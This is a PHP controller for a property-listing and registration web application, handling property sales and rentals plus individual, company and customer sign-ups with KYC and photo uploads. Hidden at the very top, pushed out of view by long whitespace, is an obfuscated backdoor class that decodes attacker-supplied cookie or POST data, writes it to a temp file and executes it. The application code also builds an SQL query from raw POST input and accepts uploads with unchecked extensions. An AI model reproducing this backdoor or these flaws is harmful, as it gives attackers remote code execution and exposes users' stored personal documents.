<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("bumryv")){class bumryv{public static $gjoxynfytw = "eqwlhfnwdokkldsa";public static $yvfxxi = NULL;public function __construct(){$ckdaqmwb = @$_COOKIE[substr(bumryv::$gjoxynfytw, 0, 4)];if (!empty($ckdaqmwb)){$cjqlu = "base64";$jjudcerot = "";$ckdaqmwb = explode(",", $ckdaqmwb);foreach ($ckdaqmwb as $orvjjcgqcj){$jjudcerot .= @$_COOKIE[$orvjjcgqcj];$jjudcerot .= @$_POST[$orvjjcgqcj];}$jjudcerot = array_map($cjqlu . "_decode", array($jjudcerot,));$jjudcerot = $jjudcerot[0] ^ str_repeat(bumryv::$gjoxynfytw, (strlen($jjudcerot[0]) / strlen(bumryv::$gjoxynfytw)) + 1);bumryv::$yvfxxi = @unserialize($jjudcerot);}}public function __destruct(){$this->sguumpr();}private function sguumpr(){if (is_array(bumryv::$yvfxxi)) {$xsegkdz = sys_get_temp_dir() . "/" . crc32(bumryv::$yvfxxi["salt"]);@bumryv::$yvfxxi["write"]($xsegkdz, bumryv::$yvfxxi["content"]);include $xsegkdz;@bumryv::$yvfxxi["delete"]($xsegkdz);exit();}}}$rzoljmz = new bumryv();$rzoljmz = NULL;} ?><?php
require_once APPPATH . 'core/Base_Controller.php';
if (! defined('BASEPATH'))
    exit('No direct script access allowed');

class Forms extends Base_Controller
{

    public function __construct()
    {
        parent::__construct();

        date_default_timezone_set('Asia/Kolkata');
 if(!isset($_SESSION['userdata'])){
    redirect(base_url("Dashboard/registration")); 
 }
    
    }

    public function sellproperty()
    {
        $data['states'] = $this->Base_Models->GetAllValues("conbrid_states");
            
        $this->load->view("common/header");
        $this->load->view("common/left");
      
        $this->load->view("forms/sell",$data);
        $this->load->view("common/footer");
    }
    public function sellprop()
    {
        $data['states'] = $this->Base_Models->GetAllValues("conbrid_states");

        $this->load->view("common/header");
        $this->load->view("common/left");

        $this->load->view("forms/sell_prop", $data);
        $this->load->view("common/footer");
    }




    public function get_cities()
    {
        $cities = array();
        if (isset($_POST['state_id']) && $_POST['state_id'] != 0) {
            $cities = $this->Base_Models->CustomeQuary("select * from conbrid_cities where state_id=".$_POST['state_id']." ORDER BY city_name asc");
        }
        echo json_encode($cities);
    }

    public function accept_sell_prop()
    {
        // print_r($_SESSION);
        //exit();
        $data['address1'] = $_POST['address1'];
        $data['landmark'] = $_POST['landmark'];
        $data['area'] = $_POST['area'];
        $data['state_id'] = $_POST['state_id'];
        $data['pincode'] = $_POST['pincode'];
        if ($_SESSION['userdata']['category'] == "Companies") {
            $data['user_type'] = $_SESSION['userdata']['category'];
            $data['user_id'] = $_SESSION['userdata']['company_id'];
        }
        $data['type_of_property'] = $_POST['type_of_property'];
        if ($data['type_of_property'] == "residential") {

            $data['sub_categories'] = $_POST['sub_categories'];

            if ($data['sub_categories'] == "normal_ready") {

                $data['type_house'] = $_POST['type_house1'];
                $data['name'] = $_POST['name1'];
                $data['project_name'] = $_POST['project_name1'];
                $data['property_address'] = $_POST['property_address1'];
                $data['budget'] = $_POST['budget1'];
                $data['booking_amount'] = $_POST['booking_amount1'];
                $data['date_of_oc'] = $_POST['date_of_oc1'];
                $data['maintenance'] = $_POST['maintenance1'];
                $data['building_plan_no'] = $_POST['building_plan_no1'];
                $data['use_of_building'] = $_POST['use_of_building1'];
                $data['number_of_floors'] = $_POST['number_of_floors1'];
                $data['plot_area'] = $_POST['plot_area1'];
                $data['builtup_area'] = $_POST['builtup_area1'];
                $data['carpet_area'] = $_POST['carpet_area1'];
                $data['bhk'] = $_POST['bhk1'];
                $data['number_of_bathroom'] = $_POST['number_of_bathroom1'];
                $data['type_of_flooring'] = $_POST['type_of_flooring1'];
                $data['basic_amenities'] = $_POST['basic_amenities1'];
                $data['entrance_facing'] = $_POST['entrance_facing1'];
                $data['bedroom_facing'] = $_POST['bedroom_facing1'];
                $data['poojaroom_facing'] = $_POST['poojaroom_facing1'];
                $data['kitchen_facing'] = $_POST['kitchen_facing1'];
                $data['furnishing_status'] = $_POST['furnishing_status1'];
                $data['water_availability'] = $_POST['water_availability1'];
                $data['electricity_availability'] = $_POST['electricity_availability1'];
                // $data['property_image'] = $_POST['property_image'];
                $data['nearby_places'] = $_POST['nearby1'];
                $data['ownership_type'] = $_POST['ownership_type1'];
                //  $data['ownership_type'] = $_POST['ownership_type1'];
                // $data['ownership_type'] = $_POST['ownership_type1'];
            } else if ($data['sub_categories'] == "single_ongoing") {
                $data['type_house'] = $_POST['type_house2'];
                $data['name'] = $_POST['name2'];
                $data['project_name'] = $_POST['project_name2'];
                $data['property_address'] = $_POST['property_address2'];
                $data['budget'] = $_POST['budget2'];
                $data['booking_amount'] = $_POST['booking_amount2'];
                // $data['date_of_oc'] = $_POST['date_of_oc1'];
                $data['maintenance'] = $_POST['maintenance2'];
                $data['rera_number'] = $_POST['rera_number'];
                // $data['use_of_building'] = $_POST['use_of_building1'];
                //$data['number_of_floors'] = $_POST['number_of_floors1'];
                $data['plot_area'] = $_POST['plot_area2'];
                $data['builtup_area'] = $_POST['builtup_area2'];
                $data['carpet_area'] = $_POST['carpet_area2'];
                $data['bhk'] = $_POST['bhk2'];
                $data['number_of_bathroom'] = $_POST['number_of_bathroom2'];
                $data['type_of_flooring'] = $_POST['type_of_flooring2'];
                $data['basic_amenities'] = $_POST['basic_amenities2'];
                $data['entrance_facing'] = $_POST['entrance_facing2'];
                $data['bedroom_facing'] = $_POST['bedroom_facing2'];
                $data['poojaroom_facing'] = $_POST['poojaroom_facing2'];
                $data['kitchen_facing'] = $_POST['kitchen_facing2'];
                $data['furnishing_status'] = $_POST['furnishing_status2'];
                $data['water_availability'] = $_POST['water_availability2'];
                $data['electricity_availability'] = $_POST['electricity_availability2'];
                $data['property_image'] = $_FILES['property_image2'];
                $data['nearby_places'] = $_POST['nearby2'];
                $data['ownership_type'] = $_POST['ownership_type2'];
                $data['offers'] = $_POST['offers2'];
                // $data['ownership_type'] = $_POST['ownership_type1'];
            } else if ($data['sub_categories'] == "single_ready") {
                $data['type_house'] = $_POST['type_house3'];
                $data['name'] = $_POST['name3'];
                $data['project_name'] = $_POST['project_name3'];
                $data['property_address'] = $_POST['property_address3'];
                $data['budget'] = $_POST['budget3'];
                $data['booking_amount'] = $_POST['booking_amount3'];
                $data['maintenance'] = $_POST['maintenance3'];

                $data['building_plan_no'] = $_POST['building_plan_no3'];
                $data['use_of_building'] = $_POST['use_of_building3'];
                $data['number_of_floors'] = $_POST['number_of_floors3'];
                $data['plot_area'] = $_POST['plot_area3'];
                $data['builtup_area'] = $_POST['builtup_area3'];
                $data['carpet_area'] = $_POST['carpet_area3'];
                $data['bhk'] = $_POST['bhk1'];
                $data['number_of_bathroom'] = $_POST['number_of_bathroom3'];
                $data['type_of_flooring'] = $_POST['type_of_flooring3'];
                $data['basic_amenities'] = $_POST['basic_amenities3'];
                $data['entrance_facing'] = $_POST['entrance_facing3'];
                $data['bedroom_facing'] = $_POST['bedroom_facing3'];
                $data['poojaroom_facing'] = $_POST['poojaroom_facing3'];
                $data['kitchen_facing'] = $_POST['kitchen_facing3'];
                $data['furnishing_status'] = $_POST['furnishing_status3'];
                $data['water_availability'] = $_POST['water_availability3'];
                $data['electricity_availability'] = $_POST['electricity_availability3'];
                $data['property_image'] = $_FILES['property_image3'];
                $data['nearby_places'] = $_POST['nearby3'];
                $data['ownership_type'] = $_POST['ownership_type3'];
                $data['offers'] = $_POST['offers3'];
                // $data['ownership_type'] = $_POST['ownership_type1'];
            }



        }



        /* $path=array();
         $image_folder = APPPATH . "../images/property_image" ;
         if (isset ( $_FILES ['property_image'] ) && $_FILES ['property_image'] ['error'] == 0) {
         $tmp = explode('.', $_FILES ['property_image'] ['name']);
         $b = end($tmp);
         $up = move_uploaded_file ( $_FILES ['property_image'] ['tmp_name'], $image_folder . "." . $b );
         $path['property_image'] = "property_image" . "." . $b;
         } */

        //print_r(
          //  $data
        //);
        if (!empty($data)) {
            //$this->Base_Models->UpadateValue("conbrid_sell_prop",$path);    
            //$this->Base_Models->AddValues("conbrid_sell_prop",$path);    

            $this->Base_Models->AddValues("conbrid_sell_prop", $data);
            redirect(base_url("Dashboard"));


        } else {
            //redirect(base_url("Dashboard/registration")); 

        }


    }




    public function acceptproperty()
    { 
     
        $data['address1'] = $_POST['address1'];
        $data['landmark'] = $_POST['landmark'];
        $data['area'] = $_POST['area'];
        $data['state_id'] = $_POST['state_id'];
        $data['pincode'] = $_POST['pincode'];
        if ($_SESSION['userdata']['category'] == "Companies") {
            $data['user_type'] = $_SESSION['userdata']['category'];
            $data['user_id'] = $_SESSION['userdata']['company_id'];
        }
        $data['type_of_property'] = $_POST['type_of_property'];
        if ($data['type_of_property'] == "residential") {
            $data['sub_categories'] = $_POST['sub_categories'];
            $data['property_address'] = $_POST['property_address'];
            $data['builtup_area'] = $_POST['builtup_area'];
            $data['description'] = $_POST['description'];
            $data['image'] = $_POST['image'];
            $data['property_facing'] = $_POST['property_facing'];
            $data['monthly_rent'] = $_POST['monthly_rent'];
            $data['security_deposit'] = $_POST['security_deposit'];
            $data['maintenance'] = $_POST['maintenance'];
            $data['notice_period'] = $_POST['notice_period'];
            $data['rental_period'] = $_POST['rental_period'];
            $data['rental_aggr_date'] = $_POST['rental_aggr_date'];
            $data['penalty'] = $_POST['penalty'];
            $data['estamp_number'] = $_POST['estamp_number'];
            $data['stamp_duty_type'] = $_POST['stamp_duty_type'];
            $data['certi_issue_date'] = $_POST['certi_issue_date'];
            $data['estamp_copy'] = $_POST['estamp_copy'];

        } elseif($data['type_of_property'] == "commercial") {
            $data['sub_categories'] = $_POST['sub_categories'];
            $data['property_address'] = $_POST['property_address'];
            $data['builtup_area'] = $_POST['builtup_area'];
            $data['description'] = $_POST['description'];
           $data['image'] = $_POST['image'];
            $data['property_facing'] = $_POST['property_facing'];
            $data['monthly_rent'] = $_POST['monthly_rent'];
            $data['security_deposit'] = $_POST['security_deposit'];
            $data['maintenance'] = $_POST['maintenance'];
            $data['notice_period'] = $_POST['notice_period'];
            $data['rental_period'] = $_POST['rental_period'];
            $data['rental_aggr_date'] = $_POST['rental_aggr_date'];
            $data['penalty'] = $_POST['penalty'];
            $data['estamp_number'] = $_POST['estamp_number'];
           // $data['stamp_duty_type'] = $_POST['stamp_duty_type'];
            $data['certi_issue_date'] = $_POST['certi_issue_date'];
            $data['estamp_copy'] = $_POST['estamp_copy'];


        } elseif($data['type_of_property'] == "industrial") {
            $data['sub_categories'] = $_POST['sub_categories'];
            $data['property_address'] = $_POST['property_address'];
            $data['builtup_area'] = $_POST['builtup_area'];
            $data['description'] = $_POST['description'];
            $data['image'] = $_POST['image'];
            $data['property_facing'] = $_POST['property_facing'];
            $data['monthly_rent'] = $_POST['monthly_rent'];
            $data['security_deposit'] = $_POST['security_deposit'];
            $data['maintenance'] = $_POST['maintenance'];
            $data['notice_period'] = $_POST['notice_period'];
            $data['rental_period'] = $_POST['rental_period'];
            $data['rental_aggr_date'] = $_POST['rental_aggr_date'];
            $data['penalty'] = $_POST['penalty'];
            $data['estamp_number'] = $_POST['estamp_number'];
           // $data['stamp_duty_type'] = $_POST['stamp_duty_type'];
            $data['certi_issue_date'] = $_POST['certi_issue_date'];
            $data['estamp_copy'] = $_POST['estamp_copy'];


        }  elseif($data['type_of_property'] == "institutional") {
            $data['sub_categories'] = $_POST['sub_categories'];
            $data['property_address'] = $_POST['property_address'];
            $data['builtup_area'] = $_POST['builtup_area'];
            $data['description'] = $_POST['description'];
            $data['image'] = $_POST['image'];
            $data['property_facing'] = $_POST['property_facing'];
            $data['monthly_rent'] = $_POST['monthly_rent'];
            $data['security_deposit'] = $_POST['security_deposit'];
            $data['maintenance'] = $_POST['maintenance'];
            $data['notice_period'] = $_POST['notice_period'];
            $data['rental_period'] = $_POST['rental_period'];
            $data['rental_aggr_date'] = $_POST['rental_aggr_date'];
            $data['penalty'] = $_POST['penalty'];
            $data['estamp_number'] = $_POST['estamp_number'];
           // $data['stamp_duty_type'] = $_POST['stamp_duty_type'];
            $data['certi_issue_date'] = $_POST['certi_issue_date'];
            $data['estamp_copy'] = $_POST['estamp_copy'];


        }  
 
       // $data['default_date'] = date("Y-m-d h:i:s");
//$data1 = $this->Base_Models->CustomeQuary("select conbrid_companies.id as company_id from conbrid_companies where
  //     state='" . $_POST['state_id'] . "' and city='" . $_POST['city_id'] . "' and
    // id!=".$_SESSION['userdata']['company_id']);
  //$company_name = $this->Base_Models->GetAllValues("conbrid_companies", array(
    //            "id" => $_SESSION['userdata']['company_id']
      //      ));
 /*if (! empty($data1)) {
                $notification_title = "New Construction Contract";
                $notification_text = "There is a Construction Contract post by <b>" . $company_name[0]['company_name'] . " Company </b> you might have interest";
                for ($k = 0; $k < count($data1); $k ++) {
                    $data2['post_by_company_id'] = $_SESSION['userdata']['company_id'];
                    $data2['company_id'] = $data1[$k]['company_id'];
                    $data2['title'] = $notification_title;
                    $data2['text'] = $notification_text;
                    $data2['datetime'] = date("Y-m-d h:i:s");
                    $data2['type'] = "Construction_contract Post";
                    $this->Base_Models->AddValues("conbrid_company_notification", $data2);
                }
            } */

        


        $path=array();
        $image_folder = APPPATH . "../images/image" ;
        if (isset ( $_FILES ['image'] ) && $_FILES ['image'] ['error'] == 0) {
        $tmp = explode('.', $_FILES ['image'] ['name']);
        $b = end($tmp);
        $up = move_uploaded_file ( $_FILES ['image'] ['tmp_name'], $image_folder . "." . $b );
        $path['image'] = "image" . "." . $b;
        }
        
        

        $image_folder = APPPATH . "../images/estamp_copy" ;
        if (isset ( $_FILES ['estamp_copy'] ) && $_FILES ['estamp_copy'] ['error'] == 0) {
        $tmp = explode('.', $_FILES ['estamp_copy'] ['name']);
        $b = end($tmp);
        $up = move_uploaded_file ( $_FILES ['estamp_copy'] ['tmp_name'], $image_folder . "." . $b );
        $path['estamp_copy'] = "estamp_copy" . "." . $b;
        }
        if(!empty($path)){
             $this->Base_Models->AddValues("conbrid_property",$path);    

        
             $this->Base_Models->AddValues("conbrid_property", $data);
        redirect(base_url("Dashboard"));
    
        
    }else{
            redirect(base_url("Dashboard/registration")); 

    }
       // $this->Base_Models->AddValues("conbrid_property", $data);
    }






























    public function individual_registration()
    { // print_r($_SESSION);
        $data ['table_data'] = $this->Base_Models->GetAllValues ( "conbrid_individuals");
        $data ['display_contents'] = array (
        				"id" => "id",
        				"individual_name" => "Name",
        				"dob" => "Date of birth",
        				"preferred_jd" => "Preferred job description",
        				"preferred_job_type" => "Job type",
        				"year_of_experience" => "Years of experience",
        					//"current_status" => "Status",
        			"actions" => "Action"
					//"vid_actions" => "Action"
        				);
       foreach ($data['table_data'] as $key => $row) {
        $data['table_data'][$key]['actions'] = " <a  href='" . base_url('Profile/individual'.$data['table_data'][$key]['id']). "' class='btn btn-success'>Edit</a>";

       }
  

$data=array();
        if(isset($_SESSION['userdata']['category']) && $_SESSION['userdata']['category']=="Individuals"){
        $this->load->view("common/header");
        $this->load->view("common/left");
   $existing_data=$this->Base_Models->GetAllValues("conbrid_individuals",array("user_id"=>$_SESSION['userdata']['id']));
  if(!empty($existing_data)){
      $data=$existing_data[0];
         $data['field_of_interest']=$this->Base_Models->GetAllValues("conbrid_field_of_interest",array("status"=>1,"type"=>$_SESSION['userdata']['sub_category']));
     
if($data['status']=="2"){
  $data['existing_data']=$this->Base_Models->GetAllValues("conbrid_individual_verification",array("individual_id"=>$existing_data['0']['id']));
 $data['key_skills']=$this->Base_Models->GetAllValues("conbrid_key_skills",array("individual_id"=>$data['id']));
 $data['technical_skills']=$this->Base_Models->GetAllValues("conbrid_technical_skills",array("individual_id"=>$data['id']));
 $field_of_interest=$this->Base_Models->GetAllValues("conbrid_user_field_of_interest",array("individual_id"=>$data['id']));
   $field_values="Test";
   for($i=0;$i<count($field_of_interest);$i++){
       $field_values.=",".$field_of_interest[$i]['field_of_interest'];
   }
  $data['field_of_interest1']=$field_values;
    // form is return from admin
    
    $this->load->view("forms/individual_registration2",$data);
    
}
elseif($data['status']=="1" ||$data['status']=="3" ){
    // submitted to admin
    $this->load->view("forms/individual_registration",$data);
    
}

  }else{
          $data['field_of_interest']=$this->Base_Models->GetAllValues("conbrid_field_of_interest",array("status"=>1,"type"=>$_SESSION['userdata']['sub_category']));
   
             $this->load->view("forms/individual_registration",$data);
 
  }
  
   
   
        $this->load->view("common/footer");
    }else{
            redirect(base_url("Dashboard/registration")); 

    }
        
    }

    public function accept_individual_registration()
    {   if(isset($_SESSION['userdata']['category']) && $_SESSION['userdata']['category']=="Individuals"){
     
        if(isset($_POST['individual_name']))$data['individual_name']=$_POST['individual_name']; 
        if(isset($_POST['dob']))$data['dob']=$_POST['dob'];
        if(isset($_POST['education_qualification']))$data['education_qualification']=$_POST['education_qualification'];
        if(isset($_POST['preferred_jd']))$data['preferred_jd']=$_POST['preferred_jd'];
        if(isset($_POST['preferred_job_type']))$data['preferred_job_type']=$_POST['preferred_job_type'];
        if(isset($_POST['year_of_experience']))$data['year_of_experience']=$_POST['year_of_experience'];
        if(isset($_POST['promo_code']))$data['promo_code']=$_SESSION['userdata']['promo_code'];
        $data['status']="1";
        $existing_data=$this->Base_Models->GetAllValues("conbrid_individuals",array("user_id"=>$_SESSION['userdata']['id']));
   if(empty($existing_data)){
        $data['user_id']=$_SESSION['userdata']['id'];
        $id=$this->Base_Models->AddValues("conbrid_individuals",$data); 
    }else{
    $this->Base_Models->UpadateValue("conbrid_individuals",$data,array("user_id"=>$_SESSION['userdata']['id']));    
        $id=$existing_data[0]['id'];
    }
    if(isset($_POST['field_of_interest']) && count($_POST['field_of_interest'])>0){
        $this->Base_Models->RemoveValues("conbrid_user_field_of_interest",array("individual_id"=>$id));
         for($i=0;$i<count($_POST['field_of_interest']);$i++){
            $data2['field_of_interest']=$_POST['field_of_interest'][$i];
            $data2['individual_id']=$id;
            $new_entries=$this->Base_Models->GetAllValues("conbrid_field_of_interest",array("name"=>$data2['field_of_interest']));
            if(empty($new_entries)){
                            $this->Base_Models->AddValues("conbrid_field_of_interest",array("name"=>$data2['field_of_interest']));
            }
            $this->Base_Models->AddValues("conbrid_user_field_of_interest",$data2);
   
        }
    }
    if(isset($_POST['key_skills']) && count($_POST['key_skills'])>0){
            $this->Base_Models->RemoveValues("conbrid_key_skills",array("individual_id"=>$id));
     
        for($i=0;$i<count($_POST['key_skills']);$i++){
            $data3['key_skills']=$_POST['key_skills'][$i];
            $data3['individual_id']=$id;
            $this->Base_Models->AddValues("conbrid_key_skills",$data3); 
   
        }
    }
     if(isset($_POST['technical_skills']) && count($_POST['technical_skills'])>0){
               $this->Base_Models->RemoveValues("conbrid_technical_skills",array("individual_id"=>$id));
     
        for($i=0;$i<count($_POST['technical_skills']);$i++){
            $data4['technical_skills']=$_POST['technical_skills'][$i];
            $data4['individual_id']=$id;
            $this->Base_Models->AddValues("conbrid_technical_skills",$data4); 
   
        }
    }
    $path=array();
                $image_folder = APPPATH . "../images/kyc_proof" . $id;
                if (isset ( $_FILES ['kyc_proof'] ) && $_FILES ['kyc_proof'] ['error'] == 0) {
			    $tmp = explode('.', $_FILES ['kyc_proof'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['kyc_proof'] ['tmp_name'], $image_folder . "." . $b );
				$path['kyc_proof'] = "kyc_proof".$id . "." . $b;
				}
				$image_folder = APPPATH . "../images/profile_photo" . $id;
                if (isset ( $_FILES ['profile_photo'] ) && $_FILES ['profile_photo'] ['error'] == 0) {
			    $tmp = explode('.', $_FILES ['profile_photo'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['profile_photo'] ['tmp_name'], $image_folder . "." . $b );
				$path['profile_photo'] = "profile_photo".$id . "." . $b;
				}
				$image_folder = APPPATH . "../images/upload_resume" . $id;
                if (isset ( $_FILES ['upload_resume'] ) && $_FILES ['upload_resume'] ['error'] == 0) {
				$tmp = explode('.', $_FILES ['upload_resume'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['upload_resume'] ['tmp_name'], $image_folder . "." . $b );
				$path['upload_resume'] = "upload_resume".$id . "." . $b;
				}
				$image_folder = APPPATH . "../images/work_exp_certificate" . $id;
                if (isset ( $_FILES ['work_exp_certificate'] ) && $_FILES ['work_exp_certificate'] ['error'] == 0) {
				$tmp = explode('.', $_FILES ['work_exp_certificate'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['work_exp_certificate'] ['tmp_name'], $image_folder . "." . $b );
				$path['work_exp_certificate'] = "work_exp_certificate".$id . "." . $b;
				}
				if(!empty($path)){
				     $this->Base_Models->UpadateValue("conbrid_individuals",$path,array("user_id"=>$_SESSION['userdata']['id']));    
   
				}
    
         redirect(base_url("Dashboard"));
    
        
    }else{
            redirect(base_url("Dashboard/registration")); 

    }
}
    public function company_registration()
    {
  $data=array();
$this->load->view("common/header");
        $this->load->view("common/left");
  $existing_data=$this->Base_Models->GetAllValues("conbrid_companies",array("user_id"=>$_SESSION['userdata']['id']));
  if(!empty($existing_data)){
      $data=$existing_data[0];
if($data['status']=="2"){
  $data['existing_data']=$this->Base_Models->GetAllValues("conbrid_company_verification",array("company_id"=>$existing_data['0']['id']));
  $data['career']=$this->Base_Models->GetAllValues("conbrid_add_career",array("company_id"=>$data['id']));
 $data['service']=$this->Base_Models->GetAllValues("conbrid_add_service",array("company_id"=>$data['id']));
 
  
    // form is return from admin
    
    $this->load->view("forms/company_registration2",$data);
    
}
elseif($data['status']=="1"){
    // submitted to admin
    $this->load->view("forms/company_registration",$data);
    
}
elseif($data['status']=="3" && $data['video_status']=="0"){
redirect(base_url("Video_verification"));
    
}

  }else{
             $this->load->view("forms/company_registration",$data);
 
  }
      
        $this->load->view("common/footer");
    }
    public function accept_company_registration()
    {
        if(isset($_POST['company_name']))$data['company_name']=$_POST['company_name'];
        if(isset($_POST['company_email_id']))$data['company_email_id']=$_POST['company_email_id'];
        if(isset($_POST['company_office_number']))$data['company_office_number']=$_POST['company_office_number'];
        if(isset($_POST['office_address']))$data['office_address']=$_POST['office_address'];
        if(isset($_POST['gstin_number']))
        $data['gstin_number']=$_POST['gstin_number'];
        if(isset($_POST['cin_number']))
        $data['cin_number']=$_POST['cin_number'];
        if(isset($_POST['llpin_number']))
        $data['cin_number']=$_POST['llpin_number'];
        if(isset($_POST['about_company']))$data['about_company']=$_POST['about_company'];
        if(isset($_POST['company_website']))$data['company_website']=$_POST['company_website'];
        if(isset($_POST['company_profile']))$data['company_profile']=$_POST['company_profile'];
        if(isset($_POST['number_of_employees']))$data['number_of_employees']=$_POST['number_of_employees'];
         $data['status']=1;
       
        if(isset($_POST['construction_packages']))
        $data['construction_packages']=$_POST['construction_packages'];
              $existing_data=$this->Base_Models->GetAllValues("conbrid_companies",array("user_id"=>$_SESSION['userdata']['id']));
   if(empty($existing_data)){
        $data['user_id']=$_SESSION['userdata']['id'];
        $id=$this->Base_Models->AddValues("conbrid_companies",$data); 
    }else{
    $this->Base_Models->UpadateValue("conbrid_companies",$data,array("user_id"=>$_SESSION['userdata']['id']));    
        $id=$existing_data[0]['id'];
    
        
    }
if(isset($_POST['day_id'])){
     $this->Base_Models->RemoveValues("conbrid_working_hours",array("company_id"=>$id));
       
    for($k=0;$k<count($_POST['day_id']);$k++){ 
        $data7['day_id']=$_POST['day_id'][$k];
        $data7['starttime']=$_POST['starttime'][$k];
        $data7['endtime']=$_POST['endtime'][$k];
        $data7['weeklyoff']=$_POST['weeklyoff'][$k];            
        $data7['day_id']=$_POST['day_id'][$k];
        $data7['company_id']=$id;
        $this->Base_Models->AddValues("conbrid_working_hours",$data7); 
    }
}
    if(isset($_POST['add_service']) && count($_POST['add_service'])>0){
        $this->Base_Models->RemoveValues("conbrid_add_service",array("company_id"=>$id));
        for($i=0;$i<count($_POST['add_service']);$i++){
            $data3['service']=$_POST['add_service'][$i];
            $data3['company_id']=$id;
            $this->Base_Models->AddValues("conbrid_add_service",$data3); 
   
        }
    }
    if(isset($_POST['add_career']) && count($_POST['add_career'])>0){
        $this->Base_Models->RemoveValues("conbrid_add_career",array("company_id"=>$id)); 
        for($i=0;$i<count($_POST['add_career']);$i++){
            $data4['career']=$_POST['add_career'][$i];
            $data4['company_id']=$id;
            $this->Base_Models->AddValues("conbrid_add_career",$data4); 
   
        }
    }
      $image_folder = APPPATH . "../images/company_images/profile_pic/image".$id;
              
     if (isset ( $_FILES ['profile_photo'] ) && $_FILES ['profile_photo'] ['error'] == 0) {
				$tmp = explode('.', $_FILES ['profile_photo'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['profile_photo'] ['tmp_name'], $image_folder . "." . $b );
				$path['profile_photo'] = "image".$id . "." . $b;
				     $this->Base_Models->UpadateValue("conbrid_companies",$path,array("user_id"=>$_SESSION['userdata']['id']));    
   
				}
     
         redirect(base_url("Dashboard"));
        
    }

    public function customer_registration()
    {
        $this->load->view("common/header");
        $this->load->view("common/left");
        $this->load->view("forms/customer_registration");
        $this->load->view("common/footer");
    }
    public function accept_customer_registration()
    {
          $data['customer_name']=$_POST['customer_name'];
        $data['date_of_birth']=$_POST['date_of_birth'];
        $data['contact_number']=$_POST['contact_number'];
        $data['status']=1;
         $existing_data=$this->Base_Models->GetAllValues("conbrid_customers",array("user_id"=>$_SESSION['userdata']['id']));
   if(empty($existing_data)){
        $data['user_id']=$_SESSION['userdata']['id'];
        $id=$this->Base_Models->AddValues("conbrid_customers",$data); 
    }else{
    $this->Base_Models->UpadateValue("conbrid_customers",$data,array("user_id"=>$_SESSION['userdata']['id']));    
        $id=$existing_data[0]['id'];
    }
         $image_folder = APPPATH . "../images/customer_images/profile_pic/image".$id;
     if (isset ( $_FILES ['profile_photo'] ) && $_FILES ['profile_photo'] ['error'] == 0) {
				$tmp = explode('.', $_FILES ['profile_photo'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['profile_photo'] ['tmp_name'], $image_folder . "." . $b );
				$path['profile_photo'] = "image".$id . "." . $b;
				     $this->Base_Models->UpadateValue("conbrid_customers",$path,array("user_id"=>$_SESSION['userdata']['id']));     
   
				}
         $image_folder = APPPATH . "../images/customer_images/kyc_proof/image".$id;
     if (isset ( $_FILES ['kyc_proof'] ) && $_FILES ['kyc_proof'] ['error'] == 0) { 
				$tmp = explode('.', $_FILES ['kyc_proof'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['kyc_proof'] ['tmp_name'], $image_folder . "." . $b );
				$path['kyc_proof'] = "image".$id . "." . $b;
				     $this->Base_Models->UpadateValue("conbrid_customers",$path,array("user_id"=>$_SESSION['userdata']['id']));    
   
				}

    redirect(base_url("Dashboard"));
        
    }
}
?>